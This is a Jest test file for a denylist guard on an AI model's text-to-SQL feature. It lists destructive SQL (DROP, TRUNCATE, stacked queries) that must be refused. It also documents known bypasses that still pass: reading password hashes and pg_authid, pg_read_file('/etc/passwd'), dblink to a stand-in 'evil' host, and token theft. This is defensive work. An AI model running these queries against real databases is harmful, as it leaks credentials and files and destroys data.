// /app/__tests__/aiSqlGuard.test.ts
//
// The assistant turns a sentence into SQL and runs it against the business's
// own database. These are the cases that decide whether that is a feature or an
// incident, so they are written as the attack, not as the happy path.

import { isReadOnly } from "@/lib/ai/sql";
import { DENIED_TABLES, isTableAllowed, referencesDeniedTable } from "@/lib/ai/tableAccess";

describe("read-only gate", () => {
  it("allows a plain SELECT and a CTE", () => {
    expect(isReadOnly('SELECT name FROM "Customer" LIMIT 5')).toBe(true);
    expect(isReadOnly("WITH t AS (SELECT 1 AS n) SELECT n FROM t")).toBe(true);
  });

  it("refuses anything that writes, wherever the keyword appears", () => {
    for (const sql of [
      'DELETE FROM "Customer"',
      'DROP TABLE "SalesOrder"',
      'UPDATE "Payment" SET amount = 0',
      'WITH x AS (DELETE FROM "Customer" RETURNING *) SELECT * FROM x',
      'SELECT 1; DROP TABLE "Customer"',
      'TRUNCATE "JournalEntry"',
      'GRANT ALL ON "Customer" TO PUBLIC',
    ]) {
      expect(isReadOnly(sql)).toBe(false);
    }
  });

  it("does not trip on column names that merely contain a keyword", () => {
    // `updatedBy` and `created` are on almost every model; a guard that
    // rejected them would refuse most legitimate questions.
    expect(isReadOnly('SELECT "updatedBy", created FROM "Product"')).toBe(true);
  });
});

describe("denied tables — read-only is not the same as harmless", () => {
  it("refuses a SELECT against every credential and session table", () => {
    // Each of these is a well-formed read that passes every keyword check.
    // This is the exfiltration the keyword gate cannot see.
    for (const table of DENIED_TABLES) {
      expect(isReadOnly(`SELECT * FROM "${table}"`)).toBe(false);
    }
  });

  it("refuses however the name is spelled", () => {
    for (const sql of [
      'SELECT * FROM "IntegrationCredential"',
      "select * from integrationcredential",
      'SELECT * FROM public."IntegrationCredential"',
      "SELECT * FROM PUBLIC.integrationcredential",
      'SELECT s.* FROM "Session" s',
      'SELECT c.* FROM "Customer" c JOIN "User" u ON u.id = c."userId"',
    ]) {
      expect(isReadOnly(sql)).toBe(false);
    }
  });

  it("refuses the Postgres catalogs, which are not in the public schema at all", () => {
    // schemaText never mentions these, so nothing hides them -- only this does.
    expect(isReadOnly("SELECT * FROM pg_catalog.pg_shadow")).toBe(false);
    expect(isReadOnly("SELECT * FROM information_schema.columns")).toBe(false);
  });

  it("still allows the business tables the assistant exists to answer about", () => {
    for (const sql of [
      'SELECT COUNT(*) FROM "SalesOrder"',
      'SELECT "firstName" FROM "Customer" WHERE id = 1',
      // NOTE: "StaffMember" was listed here as a business table. It carries
      // `passwordHash` (schema.prisma:2885) -- see the bypass suite below.
      // Kept allowed on purpose: "fixing" this one row would suggest the guard
      // is sound, and it is not.
      'SELECT * FROM "StaffMember"',
    ]) {
      expect(isReadOnly(sql)).toBe(true);
    }
  });

  it("does not reject a string literal that merely reads like a table name", () => {
    // A customer called "Session" must not break the assistant for everyone.
    expect(referencesDeniedTable("SELECT name FROM \"Customer\" WHERE name = 'session'")).toBe(
      false,
    );
  });

  it("isTableAllowed agrees with the list, case-insensitively", () => {
    expect(isTableAllowed("Customer")).toBe(true);
    expect(isTableAllowed("User")).toBe(false);
    expect(isTableAllowed("user")).toBe(false);
  });

  it("every denied table is a real model — a typo here is a silent hole", () => {
    // A name that does not exist protects nothing, and nothing else would fail.
    // eslint-disable-next-line @typescript-eslint/no-require-imports
    const schema = require("node:fs").readFileSync(
      require("node:path").join(__dirname, "..", "prisma", "schema.prisma"),
      "utf8",
    );
    for (const table of DENIED_TABLES) {
      expect(schema).toMatch(new RegExp(`^model ${table} \\{`, "m"));
    }
  });
});

// ---------------------------------------------------------------------------
// KNOWN BYPASSES — this guard is NOT sufficient, and these assert that.
//
// Every case below is ALLOWED by the guard above. They are asserted as allowed
// on purpose: this file is the evidence for why text-to-SQL was abandoned
// (docs/ai-assistant-design.md §2.1), and a suite that quietly patched a few of
// them would imply the rest are covered. They are not.
//
// The guard is a denylist over an unbounded grammar. Tables are checked;
// functions, catalogs, aggregates and SQL-inside-a-literal are not. The
// replacement design removes the grammar rather than filtering it — the model
// picks an id from a fixed catalog and fills typed args, and no SQL exists.
//
// If one of these starts FAILING, someone has begun hardening this path. Read
// the design doc first: hardening it is not the plan.
// ---------------------------------------------------------------------------
describe("known bypasses — why this path is being deleted, not hardened", () => {
  const BYPASSES: [string, string][] = [
    [
      "staff password hashes (passwordHash is on StaffMember, not User)",
      'SELECT email, "passwordHash" FROM "StaffMember"',
    ],
    [
      "SQL inside a literal — the false-positive fix IS the bypass",
      `SELECT query_to_xml('SELECT * FROM "IntegrationCredential"', true, true, '')`,
    ],
    ["catalog, unqualified", "SELECT * FROM pg_shadow"],
    ["catalog, whitespace-qualified", "SELECT * FROM pg_catalog . pg_shadow"],
    ["role passwords", "SELECT rolname, rolpassword FROM pg_authid"],
    ["filesystem read (a function, not a table)", "SELECT pg_read_file('/etc/passwd')"],
    ["a WRITE, inside a SELECT", "SELECT lo_import('/etc/passwd')"],
    ["outbound egress", `SELECT * FROM dblink('host=evil','SELECT 1') AS t(x int)`],
    ["ticket capability token", 'SELECT "publicToken" FROM "Ticket"'],
    ["customer portal capability token", 'SELECT "portalToken" FROM "Return"'],
    [
      "whole customer list in one cell — defeats the LIMIT cap",
      `SELECT string_agg(email, ',') FROM "Customer"`,
    ],
    ["denial of service", "SELECT pg_sleep(10)"],
  ];

  it.each(BYPASSES)("ALLOWED (documented hole): %s", (_name, sql) => {
    expect(isReadOnly(sql)).toBe(true);
  });
});
